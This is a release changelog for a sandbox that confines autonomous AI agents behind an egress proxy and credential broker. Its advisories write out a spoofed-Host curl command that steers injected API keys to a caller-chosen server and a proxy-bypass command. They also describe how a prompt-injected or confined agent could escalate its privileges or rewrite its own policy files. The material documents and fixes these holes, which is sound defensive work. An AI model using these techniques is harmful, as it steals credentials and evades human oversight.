# Changelog

Notable changes per release, and what you have to do to move between them.

The format is loosely [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
This project versions the **security boundary**, not the code: a major bump
means the guarantees changed or an upgrade needs manual steps to stay safe.

---

## 1.6.0 — 2026-08-08

Two halves of the same subject: who decides how much authority the agent gets,
and whether you can see how much it got.

### Fixed

**The lab container chose which Cloudflare profile was issued to it.**
`X-Cf-Profile` named the profile the addon then asked the broker to mint. That
was harmless while one profile shipped, and decorative the moment a deployment
added a second at a different privilege level — which is the entire reason
profiles exist. A prompt-injected agent asks for `prod-ir`, gets it, and the
audit line records the escalation as though it had been authorised.

The profile is now deployment configuration: `CLOUDFLARE_PROFILE`, read once at
load from the proxy's own environment. The header is still stripped so it never
reaches the vendor, but its value is discarded rather than read. The broker is
configured with the same value and 403s any other profile — that half still
holds if a future addon goes back to trusting the header, and it refuses
*before* the outbound mint.

Scoped honestly: **no credential ever leaked, and no deployment shipping only
`workers-deploy` could escalate anything** — there was one rung on the ladder.
What was broken is a property the design depends on, that the untrusted side
does not author its own authority, and it would have become exploitable in the
deployment that first added a second profile.

The general rule now has a check behind it. `header_selector` fails any addon
that binds a client-supplied request header to a name it acts on. Stripping is
not reading: a bare `pop()`/`del` is the correct way to drop a client header and
stays clean. Same family as `pretty_host` — both catch a security decision made
from data the lab container writes.

### Added

**GitHub audit lines say what the token can do, not just that one was issued.**
The broker mints installation tokens at whatever scope the App's installation
grants, and that grant is configured in GitHub's web UI, outside this stack. So
the stack inherited a ceiling it never participated in setting and then never
mentioned it again: "what can this lab currently do to GitHub?" was a question
you answered by opening GitHub settings, not by reading the trail.

`token_issued` and `credential_issued` now carry `permissions` and
`repository_selection`. Both routes — `git push` travels the credential route,
and leaving it out would have made the most-used path the least visible.

Repository *names* stay out. `observer` serves the trail over HTTP, and the
`all`/`selected` enum already answers whether the installation is org-wide.

**Reports the ceiling, does not lower it.** Narrowing what gets minted is a
different piece of work: it needs a per-scope cache and a config surface, and it
breaks `git push` if scoped wrong.

Failure degrades the trail, not the token. An unreachable installation endpoint
sets the field to `unknown` and the mint proceeds — describing a credential must
never be what stops it being issued.

**`observer` renders structured audit fields as JSON.** The dashboard built
cells as `` `${k}=${v}` ``, and `permissions` is the first nested object to
reach the trail, so it would have printed `[object Object]`. Still rendered as
text via `textContent`, never as markup.

### Upgrading

Nothing is required, and no manual step is needed to stay safe.

**`CLOUDFLARE_PROFILE` defaults to `workers-deploy`** on both the proxy addon
and the broker provider, which is what every existing deployment already
issues. Set it explicitly on **both** services if you want a different profile —
a mismatch between the two fails closed with a 403 rather than silently picking
one.

**The new invariant may report a deployment's own addons.** Any hand-written
addon that reads a request header into a variable will start showing a finding
on each `check-invariants.sh` / `check-drift.sh` run:

```
FAIL   binds a client-supplied request header to a name the addon acts on
```

If the addon acts on that value, that is the bug this release fixed, in your
copy. If it only strips the header, rewrite it as a bare `pop()`/`del`.

**The `observer` fix is an image change**, unlike the provider files beside it.
A deployment pinned below this release keeps rendering `permissions` as
`[object Object]` until it repins. Cosmetic — the field is in the trail either
way.

---

## 1.5.0 — 2026-08-02

The release that stops trusting the operator, in the same way the design
already refuses to trust the agent.

### Changed

**The `dev` service, network and directory are now `lab`.** "dev" implied a
developer sits in the container. Nobody does — it is where an autonomous agent
runs unattended, and the name was steering how the documentation described the
boundary. `stack/dev/` → `stack/lab/`, each example's `dev/` → `lab/`, the
compose service and network, and prose throughout.

Not renamed, because they name someone else's thing: `.devcontainer/`,
`devcontainer.json`, the `examples/dev-container/` directory, and "Dev
Containers" the VS Code feature.

**The `lab` network is `internal: true` by default, so the proxy can no longer
be bypassed.** The egress allowlist has been advisory since it shipped: nothing
forced traffic through the proxy, so `curl --noproxy '*'` left the container
without touching any addon. `HTTP_PROXY` is a request, not a routing
constraint. Removing the network's default gateway makes the proxy the only
route out, and the allowlist enforcing.

Verified on a running stack rather than argued:

| | `internal: true` | `LAB_INTERNAL=false` |
|---|---|---|
| lab → internet direct (`--noproxy '*'`) | blocked | 200 |
| lab → internet via the proxy (`CONNECT`) | 200 | 200 |
| lab → broker | unreachable | unreachable |
| broker → `api.github.com` (on `secure`) | 200 | 200 |

Proxied traffic is unaffected because the **proxy** resolves the hostname, not
the client. `secure` is deliberately not internal — the broker calls provider
APIs directly through it.

`LAB_INTERNAL=false` opts out, for tooling that cannot use an HTTP proxy at all
(raw sockets, `ssh`, anything resolving before it proxies). The symptom of
needing it is a DNS failure inside the lab, not a proxy error. Opting out costs
egress mediation and nothing else: the broker stays unreachable either way,
because that is `secure` network isolation and this flag does not touch it. It
is never silent — `check-invariants.sh` reports the opt-out on every run.

### Added

**`bank/` — vetted provider implementations, installed as data.** Every
security incident this project has had came from someone writing a provider
file, and two of them shipped in `PLAYBOOK.md` as the *recommended* pattern.
Making the safe version the thing you install rather than the thing you are
told to write is a different kind of control from documenting it better.

An entry is `provider.json` plus the files it implies, and is complete enough
that holding only `bank/<name>/` and a running stack is enough to install it.
`github`, `anthropic` and `cloudflare` ship as entries; their manifests were
derived from what each provider actually reads, not from the playbook's
description of it.

Three things the bank *deleted*, which is the better measure of it: the
hardcoded raw-credential path list in the lint (now derived from the
manifests), the hardcoded `AUDIT_MIN` constant (now the highest `min_stack`
among the entries an example vendors), and the per-provider prose in
`PLAYBOOK.md` that duplicated manifest data.

`check-drift.sh` now resolves `NNN_<name>.<ext>` to its bank entry by name,
before falling back to guessing which example a deployment started from. That
guess degrades on a deployment carrying many custom files; a bank file resolves
the same regardless of what sits beside it.

**`scripts/check-invariants.sh` — is your own code safe, not just current?**
`check-drift.sh` answers one question: does your copy match ours. For a file
you wrote there is no ours, so it answers `custom` and diffs nothing. A
deployment maintainer reconciled everything it reported, got a clean run, and
had two of their own addons writing secrets into the audit trail throughout.

The checks now live in `scripts/lib/invariants.sh`, shared between the upstream
lint and this scanner so the two cannot drift. The scanner needs no upstream,
no pin, no provenance stub, no network and no git. `check-drift.sh` invokes it,
so neither question can be asked without the other; `SKIP_INVARIANTS=1` opts
out.

A findings-free scan is deliberately **not** reported as a pass. These are
greps against a known list, and a provider can be unsafe in ways none of them
anticipate.

**The audit trail is scanned for tainted credentials at runtime.** The static
checks find the two ways we know of to write a secret into the trail; they have
no theory of what is sensitive. `35-audit-leak.test.sh` taints every channel a
secret can arrive on, drives real traffic through all four shipped addons, and
scans the trail for the taints — so it does not need to know how a leak would
be spelled.

### Upgrading

Two of these need action. Both are one-time.

**1. The rename.** Renaming a compose service and network means an existing
deployment keeps an orphaned `dev` container and network unless it is brought
down first:

```bash
docker compose down          # before pulling the new compose
docker compose up -d
```

If you copied `devcontainer.json`, its `"service": "dev"` is now stale — change
it to `"lab"`. Nothing pinned breaks: both examples build their lab image from
their own `./lab`, and old tags keep resolving.

**2. Unmediated egress is now reported.** A deployment whose `lab` network has
no `internal:` key — which is every deployment predating this release — will
start seeing a finding on each `check-drift.sh` run:

```
FAIL   lab network has no `internal:` key — egress is unmediated
```

That is the intended behaviour, not a false positive: the control was absent
before and nothing said so. Add `internal: ${LAB_INTERNAL:-true}` to the `lab`
network to fix it, and expect anything in the lab that cannot use an HTTP proxy
to stop working — that is the control taking effect. `LAB_INTERNAL=false` keeps
the old behaviour and keeps the finding.

Nothing forces you to adopt `bank/`. Existing hand-maintained provider files
keep working; `check-drift.sh` resolves them against the bank when the names
match and falls back to the example when they do not.

---

## 1.4.3 — 2026-07-30

### Fixed

**All three injection addons forwarded the agent's own credential when the
broker was unreachable.** Each one states that it replaces whatever the client
sent. None of them did on the failure path, because stripping and injecting
were the same statement:

```python
flow.request.headers["Authorization"] = f"token {_get_token()}"   # before
```

`_get_token()` raises when the broker cannot be reached, so neither half runs —
not the injection, and not the strip. `020_anthropic.py` reached the same end
by a different route: its fetch sat ahead of the strip loop, so the loop never
ran either. Verified against the real addons with no broker reachable, the
vendor received the client's header verbatim:

```
GOT auth=[token CLIENT-OWN-TOKEN-abc123]
```

Same for Anthropic's `x-api-key` and `Authorization`, and Cloudflare's bearer
token.

Scoped honestly: **not a credential leak.** Nothing of ours escapes, and the
agent would need a token it already holds. What breaks is a property the stack
states — that the proxy replaces client-supplied auth — so a dev container
carrying its own credential could reach the vendor with it any time the broker
was down.

The fix is ordering, not error handling: strip unconditionally as its own
statement, then fetch, then inject. **Fail mode is deliberately unchanged** —
the request still goes out unauthenticated and the vendor still 401s, which is
a signal the agent can act on. Making that configurable (`injection.fail_mode`)
is design work rather than a patch.

**`PLAYBOOK.md` carried the vulnerable ordering in prose** — "fetch a token
from the broker route added above, inject it, strip whatever the client sent".
The same copy-source failure as 1.4.2's Telegram snippet, one release later:
the instructions for writing an addon described the bug, so a provider written
by following them inherited it. Reordered, with the reason attached.

New coverage in `tests/integration/25-proxy-injection.test.sh`. It has to run
last and build its own proxy — the addons cache for five minutes, so a proxy
that already injected successfully serves from cache, never reaches the broker,
and leaves the failure path untested.

**Upgrading:** nothing in `stack/` changed and no image moved. The changed
files are `examples/*/proxy/*.py` and `PLAYBOOK.md`, which repinning does not
deliver — the same bind-mount split 1.4.0 is about. If your deployment vendored
these addons, apply the reorder to your own copies: the strip must be its own
statement, and it must come before the broker fetch.

---

## 1.4.2 — 2026-07-29

### Fixed

**`PLAYBOOK.md`'s Telegram snippet built the leak it warns about.** The
"What is safe to log" section states in bold that `flow.request.path`
includes the query string, and the code block directly under it then split
the raw path on `/`:

```python
api_method = flow.request.path.split("/")[2]     # before
```

On `/bot<TOKEN>/sendMessage?chat_id=…&text=…` that returns the whole of
`sendMessage?chat_id=…&text=…` — the recipient and the message body, written
into the audit trail as if it were a method name, and served over HTTP by
`observer`. The bot token is in segment 1 and never appeared, which is
precisely what let the snippet read as safe: the comment above it says
"never log the path itself", and it doesn't.

Shipped as the recommended Telegram pattern from 1.2.0 through 1.4.1. The
snippet now strips the query string before splitting and indexes
defensively — an addon that raises on a malformed path takes the request
down with it, and a short path is what a prober sends.

Reported by a deployment maintainer whose own Telegram addon had followed
it. Found while reconciling for 1.4.0 — the release about not logging raw
paths, which could not tell them, because `check-drift.sh` correctly reports
a custom addon as `custom` and diffs nothing. That structural gap is
[#26](https://github.com/lpezet/secure-agent-lab/issues/26), for 1.5.0.

### Added

**A static check for `pretty_host`, the invariant that had none.** "Never
use `flow.request.pretty_host` for a security decision" is the first
non-obvious invariant in `CLAUDE.md`, with a real regression behind it —
every addon originally matched `pretty_host`, so a spoofed `Host` header
collected a real injected credential. Its only coverage was runtime
(`tests/integration/20`, `25`, `30`), which is exactly what a deployment
cannot run against its own addons.

`000_policy.py` is exempt and is the only file that is: it ORs `pretty_host`
with the real host to *widen* a block, and trusting a claimed `Host` to deny
more is safe where trusting it to permit is not. The exemption is positional
rather than semantic, since that file is copied verbatim and
`check-drift.sh` already enforces that it matches.

**Upgrading:** nothing in `stack/` changed and no image moved. If you wrote
a custom addon by following the playbook's Telegram pattern, check it —
`split("?", 1)[0]` before any `split("/")`. Both new checks run as part of
`tests/run.sh`; making them runnable against a deployment's own files is
[#26](https://github.com/lpezet/secure-agent-lab/issues/26).

---

## 1.4.1 — 2026-07-29

### Fixed

**`cred-gateway/github.conf` pointed at directories no deployment has.** Both
examples opened with "Counterpart to `addons/010_github.py` and
`providers/github.js`" — those are the *container-side* mount targets, not
the directory names in a generated stack, which are `proxy/` and `broker/`
per the one-directory-per-service layout the rest of the repo uses. Anyone
following the comment went looking for directories that aren't there.

**`broker/anthropic.js` returned `""` for an empty credential file.** No call
site changes behaviour — `""` is falsy, so an empty auth-token file already
fell through to the API key — so this is contract hygiene rather than a bug
fix: `tryReadFile` reads as "the value, or null", and that stops being true
the day a caller tests `!== null`. It now returns `null`. Also picked up a
note on why the read is deliberately uncached (local file read; rotating the
credential needs no broker restart).

Both were found by running 1.4.0's own `scripts/check-drift.sh` against a
live deployment for the first time — the drift it reported in these two
files turned out to be ours, not the deployment's.

**Upgrading:** these are `examples/` files, so repinning does not deliver
them — the same bind-mount split 1.4.0 is about. Nothing here affects the
security boundary or runtime behaviour, so there's no urgency, but if you
are reconciling for 1.4.0 anyway, pin to `v1.4.1` and take both in one pass:

```bash
scripts/check-drift.sh --to v1.4.1 /path/to/deployment
```

---

## 1.4.0 — 2026-07-29

### Added

**`scripts/check-drift.sh` — 1.3.1's reconciliation step, automated.** 1.3.1
put the bind-mount trap at the centre of "Upgrading" but left the diff as a
manual walk across three directories with a different resolution rule per
file. This runs it. It reads the deployment's own pin from `compose.yaml`
and its provenance from the stub `CLAUDE.md`, resolves each bind-mounted
file against the right upstream counterpart, and reports `DRIFT`, `MISSING`
or `custom`:

```bash
scripts/check-drift.sh --to v1.4.0 /path/to/deployment
scripts/check-drift.sh --to v1.4.0 --show-diff /path/to/deployment
```

Needs only bash, git and diff, and exits non-zero on drift or an absent
`000_policy.py`, so it doubles as a pre-upgrade CI gate. The counterpart
resolution is the part worth having a tool for: most files compare against
`examples/`, but `000_policy.py` and `001_allowlist.py` compare against
`stack/proxy/addons/`, because the proxy image ships no addons at all and a
policy addon that was never vendored is a *missing* control rather than a
stale one. Custom providers are reported as `custom` and don't fail the run
— they have nothing upstream to drift from. Covered by
`tests/integration/05-check-drift`, which needs no docker.

### Changed

**The broker records its failures, not just its successes.**
`stack/broker/server.js` emitted audit events only from the paths that
worked: an unroutable request or a handler that threw left nothing in the
trail, which during an incident reads as "never happened" rather than
"happened, and failed". It now emits `route_not_found` and `request_failed`.

Both are deliberately terse about anything the caller supplied. A 404 names
the provider *namespace*, and only when it matches one this server actually
registered — never the requested path. A provider that carries its
credential in the URL (Telegram's `/bot<TOKEN>/<method>`) would otherwise
write a live secret into a file `observer` publishes over HTTP, and
truncating to N segments cannot help, since the secret is as likely to be in
the first segment as any other. A failure is named by `err.code` or
`err.name`, never `err.message` — providers build those from vendor response
bodies. Full detail still goes to stdout, which `observer` does not read.

The 500 response body is now a flat `{"error":"internal error"}` for the
same reason. That is the only externally visible behaviour change in this
release; nothing in the stack parses that body.

**Addons log a parsed endpoint instead of the raw request path.** The
shipped `020_anthropic.py` and `030_cloudflare.py` recorded
`flow.request.path` directly. Two problems: **mitmproxy's
`flow.request.path` includes the query string**, so "I only logged the path"
was never the guarantee it sounded like, and a path that is safe today
starts carrying an id or a token the moment the provider adds an endpoint.
Both now parse an endpoint — query string dropped, then the leading
segments, sized per provider (two for Anthropic, three for Cloudflare, whose
paths carry an account id deeper in) — so the trail records `/v1/messages`
rather than `/v1/messages/batches/<id>?beta=…`. Which slice is safe is
exactly what differs between providers, so there is no shared helper for it
in `audit.py`. The `/v1/organizations` policy check still tests the real
path; only the logging changed.

**`examples/dev-container` repinned to 1.3.1 and moved to
`/anthropic/cred`.** It was still pinned at v1.1.0 and carrying the older
single `/anthropic/key` route with `x-api-key` injection, which silently
drops a Claude subscription's OAuth token to API-key billing and rate
limits. It now matches `examples/claude-code`: `/anthropic/cred` returning
`{type, value}`, preferring `ANTHROPIC_AUTH_TOKEN_PATH` over
`ANTHROPIC_API_KEY_PATH`. Providing an OAuth token is now a file drop plus
the new `ANTHROPIC_AUTH_TOKEN_PATH` line in `compose.yaml`.

**`PLAYBOOK.md`: the audit trail's leak risk is located at `observer`.** The
guidance had grown into prescribing how a provider should handle its own
exceptions, which is below this project's layer. It now states the property
instead: the images contribute no audit events, so every line in the trail
was written by a provider or addon file the *deployment* owns, and
`observer` publishes whatever that is over HTTP. It is the one service whose
safety is inherited rather than supplied — which is what makes "log values
you chose yourself" a boundary rule and not a style preference. Same note
added to `CLAUDE.md`'s `observer` section, which read as an unqualified
"holds no credentials".

**Upgrading:** the two halves come apart in this release, so both steps
matter.

*Images:* `stack/broker/server.js` changed, so repinning and rebuilding gets
you the broker's failure logging — `build --pull`, then `up -d
--force-recreate`, then `docker compose images` to confirm the tag actually
moved.

*Bind-mounts:* the addon and provider changes above are in `examples/`,
which means they are **not** delivered by repinning. If your deployment was
generated from either example, reconcile:

```bash
scripts/check-drift.sh --to v1.4.0 /path/to/deployment
```

Nothing here is a security regression if you skip it — the raw-path logging
is a hazard that depends on your provider, and the Anthropic route change is
a billing-tier issue rather than a boundary one. But this is the first
release whose own contents demonstrate the trap the tool exists for, so it
is worth running once even if you believe you are clean.

---

## 1.3.1 — 2026-07-28

### Added

**`LICENSE` — MIT.** The repo had shipped without one, which left anyone
vendoring `stack/` or `examples/` into their own project with no stated
terms. No functional change.

### Changed

**`PLAYBOOK.md` now covers maintenance, not just generation.** The file
landed in 1.2.0 written almost entirely for the generate-a-new-stack case;
"Upgrading" was three lines. Most real use of a deployment is the other
thing. Rewritten after two rounds of review from an agent maintaining a live
deployment of this stack:

- **The bind-mount trap is now the first thing "Upgrading" says.** A
  deployment is versioned in two halves and only one moves when you repin:
  `compose.yaml` builds each image from `stack/<service>` at the tag, but the
  files that enforce the boundary (`proxy/*.py`, `broker/*.js`,
  `cred-gateway/*.conf`) are bind-mounted from the deployment's own
  directories. Bumping the tag upgrades the images and leaves those files
  untouched. That warning previously existed only in this file's 0.1.0 →
  1.0.0 entry, so an upgrade that didn't cross that boundary never saw it —
  which is how a real deployment ended up running post-1.0.0 images beside
  pre-1.0.0 `pretty_host` addons. "Upgrading" is now a six-step procedure
  with the reconciliation diff as its centre.
- **`restart` no longer appears as the way to apply an upgrade.** Neither
  `docker compose restart` nor a bare `up -d` rebuilds — the image is tagged
  `<project>-<service>` and already exists, and Compose builds only when one
  is missing. A changed git-URL tag in `build:` on its own gets you the old
  image in a freshly recreated container. The step is now `build --pull`,
  `up -d --force-recreate`, `docker compose images`.
- **Anthropic: the credential-type-aware shape is documented.** The section
  described `examples/dev-container`'s older `/anthropic/key` + `x-api-key`
  route, so a Claude Code deployment following it literally injected an API
  key over a subscription OAuth token — no error, just a silent drop to
  API-key rate limits and billing. `/anthropic/cred` returning `{type,
  value}` and preferring `ANTHROPIC_AUTH_TOKEN_PATH` has shipped in
  `examples/claude-code` since 1.2.0; only the playbook was stale.
- **Provenance is recorded at generation time.** The stub `CLAUDE.md` now
  carries the pin, which `examples/` directory the deployment was generated
  from, the tag each bind-mounted directory was last reconciled against, and
  the custom files that have no upstream counterpart. Without the first two
  the reconciliation diff can't be run at all; the third makes a skipped
  reconciliation visible instead of silently inheriting a new pin.
- **Audit logging gained the rules that make it safe and complete**: never
  log headers, bodies or query strings, and never log a path for a provider
  that carries its credential in the URL (Telegram's `/bot<TOKEN>/<method>`)
  — parse an identifier instead; log refusals and failures, not just
  successes; and `audit.js`/`audit.py` are libraries, so a custom provider
  that calls neither is invisible while the dashboard looks complete.
- **Also**: the egress allowlist is documented as an opt-in feature rather
  than mentioned in passing; `observer`'s published port is env-indirect so
  two stacks can share a host; a live spoofed-`Host` check against the broker
  replaces the claim that verifying it needed more setup than it was worth;
  and custom providers now come with an explicit statement that you own them
  permanently and no upstream fix will reach them.

**Upgrading:** nothing in `stack/` changed — no image, addon, provider or
gateway file moved, and the security boundary is identical to 1.3.0.
Repinning is enough.

If your deployment has been repinned at any point *without* reconciling its
bind-mounted files against the tag, run the new "Upgrading" procedure once
against your current pin before moving on. That is the case this release
exists to make routine, and a deployment in it has no symptom to notice.

---

## 1.3.0 — 2026-07-26

### Changed

**Repo renamed: `secure-autonomous-agents` → `secure-agent-lab`.** No code or
security-boundary changes — purely a rename, done directly on GitHub. Every reference is
updated: this repo's own build URLs (`examples/*/compose.yaml`), `PLAYBOOK.md`'s stack name
and pinned-tag fetch URL, the README title, and the `tests/integration/00-config-lint.test.sh`
regexes that parse those build URLs.

**Upgrading:** update your local git remote —

```bash
git remote set-url origin git@github.com:lpezet/secure-agent-lab.git
```

GitHub redirects the old URL for now, but don't rely on that indefinitely. If your own
deployment's `compose.yaml` builds `stack/*` from this repo's git URL directly, point it at
`secure-agent-lab.git#vX.Y.Z` on your next repin.

### Added

**`examples/claude-code` repinned from `v1.0.0` to `v1.2.0`.** No `stack/` security behavior
changed in that range — `v1.0.0` already carries the `1.0.0` security fixes, and everything
since is the audit-logging feature added in `1.1.0`. This example's own `broker`/`proxy` files
now call the audit helpers (`require("../audit")`/`import audit`), as required once pinned
that high. Unlike `dev-container`, it deliberately does not wire up the `audit-logs` volume or
the `observer`/`log-rotator` services — the calls are no-ops here by design (documented as
safe in `CLAUDE.md`). See `examples/claude-code/README.md`'s new "Audit logging" section for
how to add the live dashboard if you want it.

No upgrade steps for this part: additive only, and the calls are no-ops without `AUDIT_LOG`
set.

---

## 1.2.0 — 2026-07-26

### Added

**`PLAYBOOK.md`: the end-user-facing entry point for deploying and extending the stack.**
`CLAUDE.md` had accumulated both maintainer-only content (how this repo's own services are
built, tested, and released) and end-user content (how to generate a deployment, add a
credential provider, upgrade between versions) in one file scoped to developing this repo.
That end-user-facing material — generation constraints, the Known Providers reference, and
"Adding a credential provider to an existing stack" — now lives in `PLAYBOOK.md` instead.
`CLAUDE.md`'s overlapping invariants and provider section are trimmed to point there, keeping
only the maintainer-only bits (how `stack/`'s own services are wired, tested, and released).

No upgrade steps: this is a documentation reorganization with no code changes.

---

## 1.1.3 — 2026-07-26

### Fixed

**`examples/claude-code`'s Anthropic credential no longer lives in `.env`.** It previously held
a literal `ANTHROPIC_API_KEY` (or `ANTHROPIC_AUTH_TOKEN`) value — the only secret in either
example that wasn't a file under `~/.config/agent-creds/`, inconsistent with the GitHub App
private key sitting right next to it in the same directory, and an easy file to accidentally
`cat`, commit, or share. The broker now reads `ANTHROPIC_API_KEY_PATH` /
`ANTHROPIC_AUTH_TOKEN_PATH`, the same convention `GITHUB_APP_PRIVATE_KEY_PATH` already used.
`tests/e2e` mounts this example's broker directly, so its `compose.yaml`, `.env.example`,
`run.sh` preflight check, and README are updated to match.

**Upgrading:** move the value out of `.env` into a file, then delete the line:

```bash
printf '<your-key>' > ~/.config/agent-creds/anthropic.key   # or anthropic-auth.token for an OAuth token
chmod 600 ~/.config/agent-creds/anthropic.key
```

Remove `ANTHROPIC_API_KEY=`/`ANTHROPIC_AUTH_TOKEN=` from `examples/claude-code/.env`, then:

```bash
docker compose up -d --force-recreate broker proxy    # proxy restart needed — it caches the key for 5 min
```

---

## 1.1.2 — 2026-07-26

### Added

**Documented the release-branch process in `CLAUDE.md`.** No code changes. Writes down the
process used for `1.1.0` through this release: every release branch cuts from `main`, both the
next patch and next minor branches get cut immediately after each tag, and — the step that
keeps them from silently diverging — `main` gets merged into every other still-open release
branch right after a release ships.

No upgrade steps.

---

## 1.1.1 — 2026-07-26

### Added

**`examples/dev-container` now has the audit-log dashboard.** Repinned `broker`/`proxy`/
`cred-gateway` from `#v1.0.0` to `#v1.1.0` and added `observer`/`log-rotator`, same as
`stack/compose.yaml`. This example's own provider/addon files now call `logEvent`/
`audit.log_event` too, so real events (token issuance, injected credentials, policy blocks)
show up in the dashboard, not just cred-gateway's request log. VS Code forwards the dashboard
port automatically, labeled "Audit log dashboard" in the Ports tab.

`examples/claude-code` is unaffected — still on `v1.0.0`, to be repinned in a later release.

No upgrade steps: existing `examples/dev-container` deployments pick this up on their next
`docker compose up --build`, and every new env var/volume mount is additive.

---

## 1.1.0 — 2026-07-26

### Added

**Audit logging: `observer` and `log-rotator`.** `broker`, `proxy`, and `cred-gateway` now
write a structured, secret-free JSONL trail — what got injected, blocked, or issued, never a
credential value — to a shared `audit-logs` volume. `observer` tails it and serves a live view
at `http://localhost:9000` (loopback-only, with no `secure`/`dev` network membership of its
own — Docker volumes aren't network-scoped, so it reaches the trail without joining either).
`log-rotator` rotates the files daily via `logrotate` (`copytruncate`, 14-day retention, a
`maxsize` safety net) and self-heals the shared volume's permissions on every start, since
`broker` (`node`) and `proxy` (`mitmproxy`) are different non-root uids writing into one
directory.

Available today in `stack/compose.yaml` — see `stack/CLAUDE.md` for a smoke-test walkthrough
that needs no real credentials. Not yet wired into `examples/` in this release.

No upgrade steps: every new environment variable and volume mount is additive and a no-op if
absent, and nothing about the existing security boundary changed.

---

## 1.0.0 — 2026-07-22

### Security

**Fixed: a spoofed `Host` header made the proxy send credentials to any server
of the caller's choosing.** Every addon matched `flow.request.pretty_host`,
which prefers the client-supplied `Host` header, while mitmproxy actually
connects to `flow.request.host` (absolute-form URI, CONNECT authority, or TLS
SNI). From inside the dev container:

```bash
curl --proxy http://proxy:8080 -H 'Host: api.anthropic.com' http://my-server/v1/messages
```

The addon believed the request was bound for Anthropic, fetched the real API
key from the broker, and injected it into a request delivered to `my-server`.
The same trick worked against `000_policy.py`, so `-H 'Host: anything'` reached
`broker:8080/github/token` — the proxy is the only component bridging the `dev`
and `secure` networks, so network isolation does not cover that path. It also
defeated `001_allowlist.py` egress control outright.

Three credential types were exposed: the Anthropic API key or auth token,
GitHub App installation tokens, and scoped Cloudflare tokens. Nothing in the
logs looks unusual — the proxy records an ordinary `server connect`.

All addons now match `flow.request.host`. `000_policy.py` additionally checks
the claimed host, so a request merely *labelled* internal is refused too.

> **Rotate your credentials as part of this upgrade.** Treat any secret that
> was reachable through a 0.1.0 proxy as disclosed unless you are certain no
> untrusted code ran in the dev container. Absence of evidence is not evidence
> here — a successful exfiltration leaves no distinctive trace.

**Fixed: the dev container could rewrite the stack's own configuration**
(`examples/dev-container`). That example mounts `../` — the parent of
`.devcontainer` — read-write at `/workspace`, so the agent could edit
`proxy/`, `broker/`, `cred-gateway/` and `compose.yaml`: neuter the policy
addon, add a prefix-match location exposing `/github/token`, or point a
provider at a host it controls. It could not restart the containers itself, but
the edit persisted and took effect the next time a human did. A nested
read-only bind now shadows `.devcontainer` while the project stays writable.

**Fixed: an inline comment in the proxy allowlist disabled the domain it was
written on.** `api.example.com  # read only` parsed `# read only` as the method
list, so every method was blocked. Fail-closed, but silent — the domain simply
stopped working. Comments are now stripped before parsing.

### Changed

**`cred-gateway` ships no provider endpoints.** The base image previously baked
in `/github/credential` and `/github/identity`. It now serves `/healthz`,
`include /etc/nginx/gateway.d/*.conf`, then `location / { return 403; }` — so
out of the box it denies everything. Endpoints come from a bind-mounted
directory of snippets, the same convention the broker already used for
`/app/providers` and the proxy for `/addons`: the base image is mechanism, the
deployment supplies content. This is what lets you add endpoints for your own
providers without forking the image.

**`examples/claude-code` runs the dev container as `agent`, not `root`.** The
`ubuntu` user is renamed to `agent`, `HOME` becomes `/home/agent`, and Claude
Code installs under that user. The persisted-state mounts move to match
(`/root/.claude` → `/home/agent/.claude`, and likewise `.claude.json` and
`.config`) — `tests/integration/00-config-lint` now checks those targets
against the image's `HOME`, since a mismatch loses settings silently rather
than failing.

**`CLAUDE_VERSION` build arg** in the same example pins or refreshes the Claude
Code install without busting the apt/node/bun layers.

**Both examples are laid out one directory per service:**

```
addons/     *.py    →  proxy/         mounted at /addons
providers/  *.js    →  broker/        mounted at /app/providers
gateway.d/  *.conf  →  cred-gateway/  mounted at /etc/nginx/gateway.d
dev/                   (unchanged)
```

Contents are untouched — this is purely a move. Previously you had to know that
addons are a mitmproxy concept and providers a broker one to work out which
directory fed which service; now the directory is named after the service and
holds nothing but the files that service loads.

Nothing breaks for an existing deployment: you own your `compose.yaml` and it
keeps pointing wherever it already points. It matters only when you re-copy
from an example or follow the docs, which now use the new paths.

**Example builds are pinned to `#v1.0.0`** instead of `#main`. Tracking a
branch meant `docker compose build` silently picked up whatever landed on main
later, while the bind-mounted addons stayed frozen at whatever you copied —
the image moving while the security-relevant files do not is precisely the
split step 1 below warns about. `tests/integration/00-config-lint` now fails
if an example points at a branch.

### Added

- **`tests/`** — two tiers behind a `tests/run.sh` facade.
  `tests/integration/` covers the security boundaries against stubs: no
  credentials, free, ~60s, 144 assertions. `tests/e2e/` covers what a stub
  cannot reach (HTTPS/CONNECT, the CA cert lifecycle, `git push` through the
  credential helper) using a dedicated GitHub App, and skips cleanly when it is
  not configured. A bare `tests/run.sh` never runs e2e.
- **`stack/cred-gateway/gateway.d/README.md`** and
  **`stack/broker/providers/README.md`** — authoring rules for the two content
  seams, and an explicit statement that both directories are empty by design.
- Reference `cred-gateway/github.conf` vendored into both examples.
- `stack/compose.yaml` now says up front that it is a reference skeleton with
  empty provider and gateway mounts, so it will not serve credentials as-is.
  It never did; it just did not say so.
- Both examples ship a commented-out allowlist mount, and the README's egress
  section is rewritten. It previously told you to copy `allowlist.sample` — a
  plain list of domains — to `001_allowlist.py`, and to uncomment a volume
  neither example had. Following it put a data file where the proxy globs
  `*.py`.

---

## Upgrading from 0.1.0

Roughly 20 minutes, most of it waiting on rebuilds. Steps 1–3 are required for
anyone; 4 and 5 depend on which example you run.

### 0. Rotate credentials

See the security note above. Do this first — the rest of the upgrade is
pointless if a disclosed key is still live.

- Anthropic: issue a new API key or auth token, revoke the old one.
- GitHub: generate a new App private key, delete the old one. Installation
  tokens expire on their own within an hour.
- Cloudflare: roll the minter token.

### 1. Update your vendored addons — `docker compose pull` will not do it

This is the step that is easy to miss. The addons are **bind-mounted from your
deployment directory**, not baked into the proxy image, so rebuilding or
repulling the image leaves the vulnerable files exactly where they are.

Copy the fixed addons over your own:

```bash
# from a fresh checkout of this repo at v1.0.0.
# Note the source path: examples moved to one directory per service in 1.0.0,
# so addons now live directly in proxy/. Your own deployment can keep whatever
# layout it already has — only the source of the copy changed.
cp examples/claude-code/proxy/*.py /path/to/your/deployment/addons/
```

If you have written your own addons, the fix is one line each — every host
comparison must use `flow.request.host`:

```python
# WRONG — the caller controls this
if flow.request.pretty_host == "api.example.com":

# RIGHT — this is where mitmproxy actually connects
if flow.request.host == "api.example.com":
```

Verify with the regression suite, which fails against the old code:

```bash
tests/run.sh 20 25 30
```

### 2. Add the `gateway.d` mount, or git stops working

The new `cred-gateway` image denies everything it is not explicitly given. If
you upgrade the image without mounting snippets, `/github/credential` and
`/github/identity` start returning **403**, the git credential helper returns
nothing, and pushes fail with an authentication error that does not mention
nginx anywhere.

